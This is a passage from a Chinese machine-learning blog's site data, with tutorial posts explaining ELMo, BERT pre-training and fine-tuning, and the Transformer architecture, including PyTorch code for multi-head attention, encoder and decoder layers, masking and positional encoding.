ELMO 前面提到过，ELMO会将静态的词转变成上下文相关的动态词向量。 这有什么好处呢？比如体会一下下面几个bank的意思： It is safest to deposit your money in the bank. They stood on the river bank to fish. The hospital has its own blood bank. 第一个是银行的意思，第二个则是河畔的意思，第三个则是库存的意思。虽然都是\"bank\"，但是和使用的上下文有关系，而word2vec学习出来的是静态的向量。 因此，ELMO进行了改进，通过RNN来训练语言模型，即给定上一个TOKEN，来预测下一个token。分别进行前向、后向的训练，将中间的hidden向量拼接起来就得到了词的vector。这是因为RNN输出某个词会考虑前面读过的句子，也就考虑了上下文，因此能得到动态的词向量。（注：这里后向的训练相当于原来句子逆向，比如正向是“潮水退了就知道” 逆向的输如则是“知道就退了潮水”）。 elmo 对于多层的RNN，每一层都有隐向量，ELMO的做法是”我全都要“。假设忘了有两层，则会输出两个隐向量（分别是下图黄色和绿色的），ELMO会对他们进行加权相加，具体的权重是通过具体任务学习出来的。 elmo-multi-layer 由上面可以看到，ELMO采用了前向和后向两个RNN分别的训练，这是为什么呢？ 因为采用双向的RNN会导致”看见答案“的问题（或者说看见自己see itself），以上面的“潮水退了就知道”这个为例，正向的RNN在预测“退了”的时候，会考虑到前面“潮水”的信息，这两个词的信息都被放入了RNN的隐向量中。而如果考虑还有一个反向的RNN，在预测”退了“的时候，会有将要预测的”就“的信息被考虑了进来，这就相当于看到了答案。因此ELMO采用了前向和后向两个RNN分别训练，从而避免了这个问题。 BERT BERT主要是预训练+fine tuning，通过在大量的语料库中得到了词的基本表示，然后在具体的任务中进行fine tuning。 BERT的结构如下图左边所示，其基本的单元是transformer的encoder的模块。 bert-gpt-elmo-compare 回想之前提到的ELMO，是使用两个单向的RNN来代替一个双向的RNN，从而使得不会有看到答案的问题。而GPT是用通过mask得分矩阵避免当前字看到之后所要预测的字，GPT只有正向的，缺失了反向的信息。而BERT呢？采用的是将预测的字用[MASK]字符代替，因此无论你是正向的还是反向的，你都不知道[MASK]这个字符原来的字是什么，只有结合[MASK]左右两边的词语信息来预测，这就达到了用双向模型训练的目的，这个细节会在后面讨论。而还有更新的XLnet模型结合了GPT和BERT的思想，用mask得分矩阵的方法来替代[MASK]这个字符，取得了更好的效果。 下面开始介绍BERT细节的东西。 预训练 之所以先讲预训练，而不是模型的输入是因为BERT的训练思想会体现在输入中。训练的部分也是BERT关键创新的部分。 在训练的语料库的选取方面，作者强调要选用document-level的而不是sentence-level的，从而具备抽象连续长序列特征的能力。 It is critical to use a document-level corpus rather than a shuffled sentence-level corpus such as the Billion Word Benchmark (Chelba et al., 2013) in order to extract long contiguous sequences. Masked LM 前面提到过，为了防止\"看见答案\"的问题，BERT将预测的字来进行替代，具体的图如下: bert-train-masked-lm 随机选择15%的word，将预测的word用[MASK]字符替代，然后用线性的分类器去预测这个word，避免了”看见答案“的问题，因为无论正向反向都不知道这个word原来是什么，从而迫使模型结合上下文来进行推测，这样就达到了用双向模型训练的目的。 但是这也引入了一个问题，就是预训练和finetuning之间是不匹配的：因为在finetuning期间从未看到[MASK]token。为了解决这个问题，BERT并不总是用实际的[MASK]来替换被mask的词汇，而是： 80% of the time: Replace the word with the [MASK] token, e.g., my dog is hairy ! my dog is [MASK] 10% of the time: Replace the word with a random word, e.g., my dog is hairy ! my dog is apple 10% of the time: Keep the word unchanged, e.g., my dog is hairy ! my dog is hairy. The purpose of this is to bias the representation towards the actual observed word. 即80%的实际用[MASK]标记替换单词，10%的时间用一个随机的单词替换该单词，还有10％的时间：保持单词不变。这样做的目的是将表示偏向于实际观察到的单词。 Next Sentence Prediction 许多重要的下游任务，如问答（QA）和自然语言推理（NLI）都是基于理解两个句子之间的关系，语言建模并没有获得这个关系。因此，为了解决这个问题，提出了Next Sentence prediction训练的方法，如下图所示： bert-train-next-sentence-prediction 即一开始是一个[CLS]的字符，用来做二分类的输出；两个句子用[SEP]字符进行隔开。在训练时句子A后面跟着的句子B有50%是真实跟在A后面的，也有50%是来自语料库随机的句子。 输入 BERT的输入如下： bert-input 这是三部分的叠加： Token Embedding，第一个单词是CLS标志，可以用于之后的分类任务 Segment Embeddings用来区别两种句子，因为有Next Sentence Prediction的任务 Position Embeddings：加入位置信息，和Transformer用三角函数不同，这里的embedding是学习出来的 Fine Tuning 前面提到过，BERT在具体任务上会进行fine tuning调整，下面对几种常见的情况做介绍。 Single Sentence Classification Task BERT做分类fine tuning比较简单，在[CLS]标识符的输出接个线性的分类器即可。如下图所示： bert-fine-tuning-single-sentence-classification-task Single Sentence tagging tasks 还有一种如Slot filling的任务，需要对输入的句子的每个词输出其类别，这个也比较简单，在每个词输出的向量用线性分类器就行。 bert-fine-tuning-single-sentence-tagging-tasks Sentence pair classification task 接下来的例子稍微复杂一点，给定前提（句子A）和假设（句子B），让你判断给定前提能否推出假设，输出ture/false/unknown。 其实就是三个类别的分类问题，也是在一开始的CLS上接个线性的分类器： bert-fine-tuning-sentence-pair-classification-task Question Answer task 给定文章和问题，要让你输出答案在文章中的开始位置和结束位置（假设答案一定出现在文章中） 具体的做法是将question和document的分别输入bert，然后对每个词都会有一个黄色的vector输出。让模型在学习两个vector（下面的红色和蓝色的），分别用来表示答案开始和结束的位置的向量。红色的和每个黄色的vector进行点层，放入softmax，得到概率最高的就是s，蓝色的同理得到e（若e &lt; s则无解）。 bert-fine-tuning-question-answer-task 小结 BERT相比ELMO和GPT模型，实现了真正的双向多层语言模型（ELMO为双向分别训练，GPT只用了单向的transformer），并显示的对句子关系建模。 Erine https://zhuanlan.zhihu.com/p/59436589 参考 李宏毅老师的MLDS NLP必读：十分钟读懂谷歌BERT模型 BERT-pytorch实现 https://www.cnblogs.com/rucwxb/p/10277217.html","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"机器学习","slug":"study/机器学习","permalink":"https://www.hrwhisper.me/categories/study/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"Deep Learning","slug":"Deep-Learning","permalink":"https://www.hrwhisper.me/tags/Deep-Learning/"},{"name":"Machine Learning model","slug":"Machine-Learning-model","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-model/"},{"name":"nlp","slug":"nlp","permalink":"https://www.hrwhisper.me/tags/nlp/"}]},{"title":"【深度学习】Attention is All You Need : Transformer模型","slug":"deep-learning-attention-is-all-you-need-transformer","date":"2020-03-29T14:36:25.000Z","updated":"2020-10-19T14:35:48.727Z","comments":true,"path":"deep-learning-attention-is-all-you-need-transformer/","link":"","permalink":"https://www.hrwhisper.me/deep-learning-attention-is-all-you-need-transformer/","excerpt":"在transformer提出前，比如做机器翻译，常用的是seq2seq的模型。这类模型以RNN作为基本的结构，每一个时刻的输入依赖于上一个时刻的输出，难以并行化计算（当然也可以用CNN来做，如textCNN，CNN可以比较好的做到并行）；此外，RNN容易忘记较早看到的信息，尽管有LSTM、GRU使用门的机制来缓解这个问题，但对于特别长的句子，仍旧是有问题的。Transformer的提出正是解决了上述两个问题。","text":"在transformer提出前，比如做机器翻译，常用的是seq2seq的模型。这类模型以RNN作为基本的结构，每一个时刻的输入依赖于上一个时刻的输出，难以并行化计算（当然也可以用CNN来做，如textCNN，CNN可以比较好的做到并行）；此外，RNN容易忘记较早看到的信息，尽管有LSTM、GRU使用门的机制来缓解这个问题，但对于特别长的句子，仍旧是有问题的。Transformer的提出正是解决了上述两个问题。 首先来看看Transformer的结构： transformer 看上去很复杂，但大体上，也是分为Encoder和Decoder，以机器翻译为例，Encoder输入“机器学习\",Decoder输出”Machine learning“。 下面对Encoder和Decoder分别进行讲解。不过在此之前，会先介绍Self-Attention机制，因为transformer中大量的采用了这个机制。 Self-Attention 想必在此之前，你已经听过了Seq2Seq模型中的Attention机制，那么它和Self Attetion有什么区别呢？我们先对了Seq2Seq模型中的Attention机制做一个简短的回顾，然后在切入主题。 Attetion in Seq2Seq model 前面提到过，seq2seq model在面对长句子的时候表现不佳，那么怎么办呢？2015年救星Attention诞生了。这个过程下面的图很生动的说明了这个情况： seq2seq-model-to-attention 注意到，一开始的Encoder-Decoder将input的sequence都encode为一个向量，而有了attention之后，多了好几个向量。这几个向量是怎么来的呢？ 这里借用李宏毅老师的PPT来向大家说明。Attention相当于权重，比如你要翻译某个词的时候，可能会更加的注意输入句子某几个词。 下面的\\(h^1,h^2,h^3,h^4\\)是对应的输出句子4个时刻的隐向量（而不是最后LSTM输出的y，因为y可能维度比较大），而\\(\\alpha_0^1\\)则代表\\(z^0\\)和\\(h^1\\)的权重，即需要关注第一个词的程度有多少。 \\(\\alpha_0^1\\)是怎么得到的呢？可以想象为一个黑盒，输入是\\(h^1\\)和\\(z^0\\)。中间的部分可以是简单的\\(z\\)和\\(h\\)的余弦距离，而可以是一个简单的网络。 seq2seq-attention1 对每个词都用\\(z^0\\)和\\(h^i\\)跑一遍，就得到了\\(\\alpha_0^1,\\alpha_0^2,\\alpha_0^3,\\alpha_0^4\\)，然后进行softmax概率归一化，得到\\(\\hat{a}_0^1，\\hat{a}_0^2，\\hat{a}_0^3，\\hat{a}_0^4\\)，接着和\\(h^i\\)相乘，就得到了\\(c^0=\\sum{\\hat{a}_0^ih^i}\\)，这个\\(c^0\\)就是Decoder的输入 seq2seq-attention2 对输出的每个时刻都重复上述的过程，相当于每个时刻对每个输入的x的权重是不一样的，得到的c也是不一样的。 seq2seq-attention3 这就是Seq2seq中的attention，简单的说就是细化Decoder每个时刻需要注意的x，从而得到不同的Decoder输入\\(c^i\\) self-attention 那么self attention是怎么样做的呢？ 来个直观的印象：左边的是RNN，有4个时刻，每个时刻输出一个b。而右边是Self-attention，它的输出也是4个b，但是这个是并行的计算的！ replace-rnn-by-self-attention 这是怎么做的呢？回想之前Encoder和Decoder的权重是由Decoder的状态\\(z\\)乘以encoder的输出\\(h\\)得到的，而self-attention比较巧妙的地方就在于将每个输入x都先做一个线性变化\\(a^i = Wx^i\\)，然后每个\\(a^i\\)都分成了3个子向量\\(q^i, k^i, v^i\\)，分别代表query，key，和value。（在实际的实现中，可以认为q，k, v分别是由3个不同的W乘上x得来） self-attention-q-k-v 然后拿每个query去对每个key做attention，得到\\(a_{1,i} = q^1\\cdot k^i/\\sqrt{d}\\)。其中d是q和k的维度，这里除以\\(\\sqrt{d}\\)是因为为了防止后过q和k随着维度的增长点积结果过大。 self-attention-q-k-v2 接下来也对各个\\(\\alpha_{1,i}\\)做softmax，得到\\(\\hat{a}_{1,i}\\)，然后每个\\(\\hat{a}_{1,i}\\)和对应的\\(v^i\\)相乘并加起来，得到输出\\(b^1 = \\sum_{i}\\hat{a}_{1,i}v^i\\)。用RNN的话说，这就是在时刻1得到的输出，并且这个输出考虑了整个句子。 self-attention-q-k-v3 用\\(q^2\\)和其他的\\(k^i\\)相乘，也就得到了\\(a_{2,i}\\)。 这里简单的做一个和Encoder-Decoder中attention的对比： Encoder-Decoder将Decoder中的隐向量\\(z^i\\)和Encoder的隐向量\\(h^i\\)做相似度计算，得到\\(a^{j}_i\\)，表示\\(i\\)时刻对第\\(j\\)个词的关注程度。然后将同一时刻的\\(a_i^j\\)归一化得到\\(\\hat{a}^j_i\\)，并和各个对应的隐向量做加权和，得到Decoder的输入\\(c^i=\\sum{\\hat{a}_0^1h^i}\\)。 而Self-attention则是首先做一个简单的线性变换，得到\\(a^i = Wx^i\\)，并将\\(a^i\\)分为三个分量\\(q^i,k^i,v^i\\)，分别代表query，key，和value。拿每个query去对每个key做attention，得到\\(a_{1,i} = q^1\\cdot k^i/\\sqrt{d}\\)， 然后softmax归一化，并和对应的value做加权和，得到输出\\(b^1 = \\sum_{i}\\hat{a}_{1,i}v^i\\) 可以看出，两个比较类似，Self-attention将Query和Key进行match，得到相应的权重，这大概是叫做”self\"的原因。 self-attention 并行化 前面提到过，self-attention能够并行化的计算，这是怎么做到的呢？其实就是用到了矩阵的乘法而已。 前面得到的query、key、value，很容易就能并行，那么计算attention的时候呢？对于同一时刻\\(a_{i,j}\\)来说容易用矩阵一下子得出： \\[ \\begin{bmatrix} \\alpha_{1,1}\\\\ \\alpha_{1,2}\\\\ \\alpha_{1,3}\\\\ \\alpha_{1,4} \\end{bmatrix} = \\begin{bmatrix} k^1 \\\\k^2\\\\k^3\\\\k^4\\end{bmatrix} q^1 \\] 而不同时刻的权重类似的能这样得到（这里为了简单，省去了除以\\(\\sqrt{d}\\)）： \\[ \\begin{bmatrix} \\alpha_{1,1} &amp; \\alpha_{2,1} &amp; \\alpha_{3,1}&amp; \\alpha_{4,1}\\\\ \\alpha_{1,2}&amp; \\alpha_{2,2} &amp; \\alpha_{3,2}&amp; \\alpha_{4,2}\\\\ \\alpha_{1,3}&amp; \\alpha_{2,3} &amp; \\alpha_{3,3}&amp; \\alpha_{4,3}\\\\ \\alpha_{1,4} &amp; \\alpha_{2,4} &amp; \\alpha_{3,4}&amp; \\alpha_{4,4}\\\\ \\end{bmatrix} = \\begin{bmatrix} k^1 \\\\k^2\\\\k^3\\\\k^4\\end{bmatrix} \\begin{bmatrix} q^1 &amp; q^2 &amp;q^3 &amp;q^4\\end{bmatrix} \\] 即\\(A = K^TQ\\)，然后\\(A\\)也容易进行softmax得到\\(\\hat{A}\\)，然后要得到输出，只需要： \\[ \\begin{bmatrix} b^1 &amp; b^2 &amp; b^3 &amp; b^4\\end{bmatrix} = \\begin{bmatrix} v^1 &amp; v^2 &amp;v^3 &amp;v^4\\end{bmatrix} \\begin{bmatrix} \\hat{\\alpha}_{1,1} &amp; \\hat{\\alpha}_{2,1} &amp; \\hat{\\alpha}_{3,1}&amp; \\hat{\\alpha}_{4,1}\\\\ \\hat{\\alpha}_{1,2}&amp; \\hat{\\alpha}_{2,2} &amp; \\hat{\\alpha}_{3,2}&amp; \\hat{\\alpha}_{4,2}\\\\ \\hat{\\alpha}_{1,3}&amp; \\hat{\\alpha}_{2,3} &amp; \\hat{\\alpha}_{3,3}&amp; \\hat{\\alpha}_{4,3}\\\\ \\hat{\\alpha}_{1,4} &amp; \\hat{\\alpha}_{2,4} &amp; \\hat{\\alpha}_{3,4}&amp; \\hat{\\alpha}_{4,4}\\\\ \\end{bmatrix} \\] 即\\(B = V \\hat{A}\\) 这就得到了所有的输出。 Multi-head self-attention Multi-head这个又是什么呢？ 其实就是将原来的\\(q^i, k^i, v^i\\)分为多个，比如两个head的话，则query分为\\(q^{1,i}, q^{i,2}\\)，则key分为\\(k^{i,1}, k^{i,2}\\)，则value分为\\(v^{i,1}, v^{i,2}\\) 第一个头的q和第一个头的k做self-attention，如下图所示。 multi-head-attention 用多个head使得有的head可以关注短的信息，而有的关注长的，各司其职。 Multi-head self-attention 代码实现 这里介绍pytorch的实现，首先是计算attention的过程即上面的query、key、和value之间的计算，它们的维度都是[n_batch, head_num, seq_len, d_each_head]，分别代表batch_size的大小，multi-head中head的个书，句子的长度，每个head的向量维度（如\\(q^{i,1}\\)的长度），mask的作用下面在讲，可以先当作None处理。返回的向量也是[n_batch, head_num, seq_len, d_each_head]的维度 12345678910def attention(query, key, value, mask=None, dropout=None): &quot;Compute &#x27;Scaled Dot Product Attention&#x27;&quot; d_k = query.size(-1) scores = torch.matmul(query, key.transpose(-2, -1)) / math.sqrt(d_k) if mask is not None: scores = scores.masked_fill(mask == 0, -1e9) p_attn = F.softmax(scores, dim = -1) if dropout is not None: p_attn = dropout(p_attn) return torch.matmul(p_attn, value), p_attn 而pytorch类前向传播可以写为： 123456789101112131415161718192021222324252627282930313233343536def clones(module, N): &quot;Produce N identical layers.&quot; return nn.ModuleList([copy.deepcopy(module) for _ in range(N)])class MultiHeadedAttention(nn.Module): def __init__(self, h, d_model, dropout=0.1): &quot;Take in model size and number of heads.&quot; super(MultiHeadedAttention, self).__init__() assert d_model % h == 0 # We assume d_v always equals d_k self.d_k = d_model // h self.h = h self.linears = clones(nn.Linear(d_model, d_model), 4) self.attn = None self.dropout = nn.Dropout(p=dropout) def forward(self, query, key, value, mask=None): &quot;Implements Figure 2&quot; if mask is not None: # Same mask applied to all h heads. mask = mask.unsqueeze(1) nbatches = query.size(0) # 1) Do all the linear projections in batch from d_model =&gt; h x d_k query, key, value = \\ [l(x).view(nbatches, -1, self.h, self.d_k).transpose(1, 2) for l, x in zip(self.linears, (query, key, value))] # 2) Apply attention on all the projected vectors in batch. x, self.attn = attention(query, key, value, mask=mask, dropout=self.dropout) # 3) &quot;Concat&quot; using a view and apply a final linear. x = x.transpose(1, 2).contiguous() \\ .view(nbatches, -1, self.h * self.d_k) return self.linears[-1](x) h, d_model代表head的个数，模型隐向量，如512。在forward中query, key, value的维度为：[n_batch, seq_len, d_model。在forward中： 首先对query, key, value分别做线性变换, 即l(x)，然后将维度转为[n_batch, seq_len, head_num, d_each_head]，即l(x).view(nbatches, -1, self.h, self.d_k). 将第1维度和第2维度交换得到维度[n_batch, head_num, seq_len, d_each_head] 然后调用attention函数，就得到了attention的输出，就是上面讲解的B，维度为[n_batch, head_num, seq_len, d_each_head] 最后将他们concat起来，得到维度[n_batch, seq_len, d_model]，然后在做线性的变换 整个过程如下面的图所示 multi-head-attention-pytorch Transformer Encoder 讲完了self attention，就可以来讲Encoder的部分了： transformer-encoder 输入 首先输入经过embedding 12345678class Embeddings(nn.Module): def __init__(self, d_model, vocab): super(Embeddings, self).__init__() self.lut = nn.Embedding(vocab, d_model) self.d_model = d_model def forward(self, x): return self.lut(x) * math.sqrt(self.d_model) 然后会有一个Positional Encoding，这个是因为self-attention完全是并行计算的，并没有考虑句子中word的排序和位置信息，就是说a b c和c b a是完全一样的。（而RNN是按照顺序对句子处理的，当前时刻有上一个时刻的hidden state）。 因此在transform中作者提出加入位置信息的编码。将位置信息的编码加上embedding后的结果就得到了最终的模型输入。那么具体是怎么做的呢？作者探索了下面两种方式： 通过训练学习 positional encoding 向量 使用公式来计算 positional encoding向量 最终效果差不多，因此采用了第二种，因为不用通过训练，且即使在训练集中没有出现过的句子长度上也能用。 具体的公示为： \\[ PE_{pos, 2i} = \\sin(pos / 10000^{2i/d_{model}})\\\\ PE_{pos, 2i + 1} = \\cos(pos / 10000^{2i/d_{model}}) \\] pos代表word在这个句子中的位置，i代表模型的维度，从\\([0...d_{model} - 1]\\) 为什么选择 sin 和 cos ？positional encoding 的每一个维度都对应着一个正弦曲线，作者假设这样可以让模型相对轻松地通过对应位置来学习。 12345678910111213141516171819class PositionalEncoding(nn.Module): &quot;Implement the PE function.&quot; def __init__(self, d_model, dropout, max_len=5000): super(PositionalEncoding, self).__init__() self.dropout = nn.Dropout(p=dropout) # Compute the positional encodings once in log space. pe = torch.zeros(max_len, d_model) position = torch.arange(0, max_len).unsqueeze(1) div_term = torch.exp(torch.arange(0, d_model, 2) * -(math.log(10000.0) / d_model)) pe[:, 0::2] = torch.sin(position * div_term) pe[:, 1::2] = torch.cos(position * div_term) pe = pe.unsqueeze(0) self.register_buffer(&#x27;pe&#x27;, pe) def forward(self, x): x = x + Variable(self.pe[:, :x.size(1)], requires_grad=False) return self.dropout(x) 波的频率和偏移对每个维度是不同的 positional-encoding Encoder Layer细节 上面的encoder的图中，注意到旁边有个N x, 这表明这部分其实是可以重复多次的，在论文中是重复了6次：第1个encoder的输出作为第2个encoder的输入，如此循环。而每个Encoder中包含两个sub-layer，一个是multi-head-attention，一个是简单的全连接网络(feed forward) 下面的代码定义了Eecoder，将sub-layer重复了N次，forward的过程也很简单，每一次的输出作为下一次的输入，最后用LayerNorm得到输出。 123456789101112class Encoder(nn.Module): &quot;Core encoder is a stack of N layers&quot; def __init__(self, layer, N): super(Encoder, self).__init__() self.layers = clones(layer, N) self.norm = LayerNorm(layer.size) def forward(self, x, mask): &quot;Pass the input (and mask) through each layer in turn.&quot; for layer in self.layers: x = layer(x, mask) return self.norm(x) LayerNorm是Hinton发表的，有些类似Batch Normalization，Batch Normalization是对同一个batch下不同数据的同一纬度进行norm的，而layer则是对同一条data做的，区别见下面的图： batch-normalization-vs-layer-normalization 123456789101112class LayerNorm(nn.Module): &quot;Construct a layernorm module (See citation for details).&quot; def __init__(self, features, eps=1e-6): super(LayerNorm, self).__init__() self.a_2 = nn.Parameter(torch.ones(features)) self.b_2 = nn.Parameter(torch.zeros(features)) self.eps = eps def forward(self, x): mean = x.mean(-1, keepdim=True) std = x.std(-1, keepdim=True) return self.a_2 * (x - mean) / (std + self.eps) + self.b_2 此外，还引入了SublayerConnection（上面图中的Add &amp; Norm），即类似ResNet的残差连接。因此每一个sub layer的输出为：\\(\\mathrm{LayerNorm}(x + \\mathrm{Sublayer}(x))\\) 12345678910111213class SublayerConnection(nn.Module): &quot;&quot;&quot; A residual connection followed by a layer norm. Note for code simplicity the norm is first as opposed to last. &quot;&quot;&quot; def __init__(self, size, dropout): super(SublayerConnection, self).__init__() self.norm = LayerNorm(size) self.dropout = nn.Dropout(dropout) def forward(self, x, sublayer): &quot;Apply residual connection to any sublayer with the same size.&quot; return x + self.dropout(sublayer(self.norm(x))) 最后是sublayer的具体定义：先进行self-attention 子层，然后用feed_forward子层，每个子层都会用SublayerConnection连接一下。 12345678910111213class EncoderLayer(nn.Module): &quot;Encoder is made up of self-attn and feed forward (defined below)&quot; def __init__(self, size, self_attn, feed_forward, dropout): super(EncoderLayer, self).__init__() self.self_attn = self_attn self.feed_forward = feed_forward self.sublayer = clones(SublayerConnection(size, dropout), 2) self.size = size def forward(self, x, mask): &quot;Follow Figure 1 (left) for connections.&quot; x = self.sublayer[0](x, lambda x: self.self_attn(x, x, x, mask)) return self.sublayer[1](x, self.feed_forward) 其中，self_atten之前已经讲过，是之前定义的MultiHeadedAttention类，feed_forward定义如下: \\[ FFN(x) = max(0, xW_1 + b_1) W_2 + b_2 \\] 其实就是两个全连接层。 12345678910class PositionwiseFeedForward(nn.Module): &quot;Implements FFN equation.&quot; def __init__(self, d_model, d_ff, dropout=0.1): super(PositionwiseFeedForward, self).__init__() self.w_1 = nn.Linear(d_model, d_ff) self.w_2 = nn.Linear(d_ff, d_model) self.dropout = nn.Dropout(dropout) def forward(self, x): return self.w_2(self.dropout(F.relu(self.w_1(x)))) Encoder 小结 Encoder 包含6个 EncoderLayer。每一个 EncoderLayer包含Multi-Headed Attention和Feed Forward两个sub-layer，subLayer还用SublayerConnection进行类似残差网络的连接。 Transformer Decoder 接下来是Decoder的部分： transformer-decoder 如果你弄懂了Encoder部分，Decoder部分也就没有那么可怕了： 输入也是 embedding + positional Encoding， 多层堆叠起来的(论文中为6)，每一层包含三个子层 masked multi-head attention：由于在机器翻译中，Decode的过程是一个顺序的过程，也就是当解码第k个位置时，我们只能看到第k - 1 及其之前的解码结果，因此加了mask，这是防止模型看到要预测的数据。 Multi-Head Attention：和Encoder的类似，6层中都接受Encoder的最后输出，作为key和value？ FeedForward：和Encoder一样 最后连接了LinearLayer和SoftmaxLayer 因此，这里先给出Decoder的定义： 1234567891011class Decoder(nn.Module): &quot;Generic N layer decoder with masking.&quot; def __init__(self, layer, N): super(Decoder, self).__init__() self.layers = clones(layer, N) self.norm = LayerNorm(layer.size) def forward(self, x, memory, src_mask, tgt_mask): for layer in self.layers: x = layer(x, memory, src_mask, tgt_mask) return self.norm(x) 可以看到，相比Encoder到多了mask的标识， 而DecoderLayer的定义为三个子层，中间也用SublayerConnection连接起来 12345678910111213141516class DecoderLayer(nn.Module): &quot;Decoder is made of self-attn, src-attn, and feed forward (defined below)&quot; def __init__(self, size, self_attn, src_attn, feed_forward, dropout): super(DecoderLayer, self).__init__() self.size = size self.self_attn = self_attn self.src_attn = src_attn self.feed_forward = feed_forward self.sublayer = clones(SublayerConnection(size, dropout), 3) def forward(self, x, memory, src_mask, tgt_mask): &quot;Follow Figure 1 (right) for connections.&quot; m = memory x = self.sublayer[0](x, lambda x: self.self_attn(x, x, x, tgt_mask)) x = self.sublayer[1](x, lambda x: self.src_attn(x, m, m, src_mask)) return self.sublayer[2](x, self.feed_forward) Masked Multi-Headed Attention 这里对mask的过程做一个介绍，首先定义函数subsequent_mask 12345def subsequent_mask(size): &quot;Mask out subsequent positions.&quot; attn_shape = (1, size, size) subsequent_mask = np.triu(np.ones(attn_shape), k=1).astype(&#x27;uint8&#x27;) return torch.from_numpy(subsequent_mask) == 0 这个函数会形成一个下三角矩阵，用来说明每个target word（行）允许看的列，未来的word不被允许看到。 1234567subsequent_mask(5)[0].int()output:tensor([[1, 0, 0, 0, 0], [1, 1, 0, 0, 0], [1, 1, 1, 0, 0], [1, 1, 1, 1, 0], [1, 1, 1, 1, 1]], dtype=torch.int32) 那么怎么用呢？ 其实细心的读者会发现DecoderLayer的forward函数中，有src_mask, tgt_mask，他们是什么区别呢？前者是原文是否为pad（NLP经常会打pad使得句子长度一样），而后者就是之前说的不能看到未来的词，可以看Batch生成的代码： 12345678910111213141516171819class Batch: &quot;Object for holding a batch of data with mask during training.&quot; def __init__(self, src, trg=None, pad=0): self.src = src self.src_mask = (src != pad).unsqueeze(-2) if trg is not None: self.trg = trg[:, :-1] self.trg_y = trg[:, 1:] self.trg_mask = \\ self.make_std_mask(self.trg, pad) self.ntokens = (self.trg_y != pad).data.sum() @staticmethod def make_std_mask(tgt, pad): &quot;Create a mask to hide padding and future words.&quot; tgt_mask = (tgt != pad).unsqueeze(-2) tgt_mask = tgt_mask &amp; Variable( subsequent_mask(tgt.size(-1)).type_as(tgt_mask.data)) return tgt_mask 完整的模型 到这里，就可以给出整个模型的代码了： 1234567891011121314151617181920212223class EncoderDecoder(nn.Module): &quot;&quot;&quot; A standard Encoder-Decoder architecture. Base for this and many other models. &quot;&quot;&quot; def __init__(self, encoder, decoder, src_embed, tgt_embed, generator): super(EncoderDecoder, self).__init__() self.encoder = encoder self.decoder = decoder self.src_embed = src_embed self.tgt_embed = tgt_embed self.generator = generator def forward(self, src, tgt, src_mask, tgt_mask): &quot;Take in and process masked src and target sequences.&quot; return self.decode(self.encode(src, src_mask), src_mask, tgt, tgt_mask) def encode(self, src, src_mask): return self.encoder(self.src_embed(src), src_mask) def decode(self, memory, src_mask, tgt, tgt_mask): return self.decoder(self.tgt_embed(tgt), memory, src_mask, tgt_mask) Generator就是之前说的LinearLayer + SoftMaxLayer 12345678class Generator(nn.Module): &quot;Define standard linear + softmax generation step.&quot; def __init__(self, d_model, vocab): super(Generator, self).__init__() self.proj = nn.Linear(d_model, vocab) def forward(self, x): return F.log_softmax(self.proj(x), dim=-1) 创建模型的helper函数： 1234567891011121314151617181920212223def make_model(src_vocab, tgt_vocab, N=6, d_model=512, d_ff=2048, h=8, dropout=0.1): &quot;Helper: Construct a model from hyperparameters.&quot; c = copy.deepcopy attn = MultiHeadedAttention(h, d_model) ff = PositionwiseFeedForward(d_model, d_ff, dropout) position = PositionalEncoding(d_model, dropout) model = EncoderDecoder( Encoder(EncoderLayer(d_model, c(attn), c(ff), dropout), N), Decoder(DecoderLayer(d_model, c(attn), c(attn), c(ff), dropout), N), nn.Sequential(Embeddings(d_model, src_vocab), c(position)), nn.Sequential(Embeddings(d_model, tgt_vocab), c(position)), Generator(d_model, tgt_vocab)) # This was important from their code. # Initialize parameters with Glorot / fan_avg. for p in model.parameters(): if p.dim() &gt; 1: nn.init.xavier_uniform(p) return modeltmp_model = make_model(10, 10, 2) 小结 个人认为Transformer的设计非常的巧妙，尤其是Self-attention layer，这使得原来并排的一个RNN可以用一个self-attetion layer替代，并且效率非常的高。Transformer影响了后面的很多模型，包括刷新了11个NLP领域方向记录大名鼎鼎的BERT，但BERT本质上是基于Transformer的预训练，个人认为不如Transformer创新度高。 这里引用知乎刘岩的做一个小结： 优点：（1）虽然Transformer最终也没有逃脱传统学习的套路，Transformer也只是一个全连接（或者是一维卷积）加Attention的结合体。但是其设计已经足够有创新，因为其抛弃了在NLP中最根本的RNN或者CNN并且取得了非常不错的效果，算法的设计非常精彩，值得每个深度学习的相关人员仔细研究和品位。（2）Transformer的设计最大的带来性能提升的关键是将任意两个单词的距离是1，这对解决NLP中棘手的长期依赖问题是非常有效的。（3）Transformer不仅仅可以应用在NLP的机器翻译领域，甚至可以不局限于NLP领域，是非常有科研潜力的一个方向。（4）算法的并行性非常好，符合目前的硬件（主要指GPU）环境。 缺点：（1）粗暴的抛弃RNN和CNN虽然非常炫技，但是它也使模型丧失了捕捉局部特征的能力，RNN + CNN + Transformer的结合可能会带来更好的效果。（2）Transformer失去的位置信息其实在NLP中非常重要，而论文中在特征向量中加入Position Embedding也只是一个权宜之计，并没有改变Transformer结构上的固有缺陷。 参考资料 The Annotated Transformer (推荐，本文的代码来自该链接) 10分钟带你深入理解Transformer原理及实现 详解Transformer （Attention Is All You Need） 从Seq2seq到Attention模型到Self Attention（一）","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"机器学习","slug":"study/机器学习","permalink":"https://www.hrwhisper.me/categories/study/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"Deep Learning","slug":"Deep-Learning","permalink":"https://www.hrwhisper.me/tags/Deep-Learning/"},{"name":"Machine Learning model","slug":"Machine-Learning-model","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-model/"}]},{"title":"【深度学习】Word2Vec","slug":"deep-learning-word2vec","date":"2019-05-05T05:35:04.000Z","updated":"2020-10-21T14:59:27.831Z","comments":true,"path":"deep-learning-word2vec/","link":"","permalink":"https://www.hrwhisper.me/deep-learning-word2vec/","excerpt":"本文主要介绍大名鼎鼎的“word2vec”。word2vec顾名思义，就是将词表示为一个向量，表示出的向量可以运用在各种各样的任务上。可以说，在BERT等模型诞生前，这个词向量的表示方法是最为流行的方法之一。 本文主要包括： 